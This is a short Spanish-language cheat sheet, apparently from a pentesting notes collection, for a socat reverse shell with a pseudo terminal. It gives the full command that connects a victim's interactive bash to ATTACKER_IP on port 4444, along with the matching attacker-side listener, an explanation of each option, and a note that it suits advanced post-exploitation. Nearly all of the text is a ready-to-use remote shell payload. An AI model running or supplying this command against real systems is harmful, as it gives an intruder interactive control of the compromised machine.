# Socat Reverse Shell — PTY

## Descripción

Esta variante utiliza socat para crear una **pseudo terminal (PTY)**, proporcionando una shell interactiva mucho más estable.

---

# Comando

```bash
socat TCP:ATTACKER_IP:4444 EXEC:"bash -li",pty,stderr,setsid,sigint,sane
```

---

# Listener

```bash
socat TCP-LISTEN:4444,fork -
```

---

# Requisitos

* socat instalado
* bash disponible

---

# Explicación

```
EXEC:"bash -li"  → ejecuta bash interactivo
pty              → crea pseudo terminal
stderr           → redirige errores
setsid           → crea nueva sesión
sigint           → permite ctrl+c
sane             → terminal usable
```

---

# Cuándo usarlo

* cuando se necesita una shell interactiva completa
* post-explotación avanzada

---

# Limitaciones

* requiere socat
